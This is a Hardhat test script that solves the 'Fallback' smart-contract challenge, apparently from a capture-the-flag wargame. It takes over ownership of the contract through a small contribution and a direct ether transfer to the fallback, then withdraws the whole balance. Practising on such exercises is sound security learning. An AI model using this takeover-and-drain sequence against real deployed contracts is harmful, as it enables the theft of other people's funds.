const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Fallback test", function() {
    beforeEach(async function() {
        users = await ethers.getSigners();
        player = users[0];
        instance = await (await ethers.getContractFactory("Fallback")).attach(process.env.FALLBACK_ADDRESS);
        expect(await instance.owner()).to.not.equal(player.address);
});
    describe("Hack test", function() {
        it("Change owner & withdraw all ether", async function() {
            await instance.connect(player).contribute({value: 1});
            await player.sendTransaction({
                to: instance.address,
                value: 1
            });

            await instance.connect(player).withdraw();
            expect(await ethers.provider.getBalance(instance.address)).to.equal(0);
            expect(await instance.owner()).to.equal(player.address);
        });
    });
});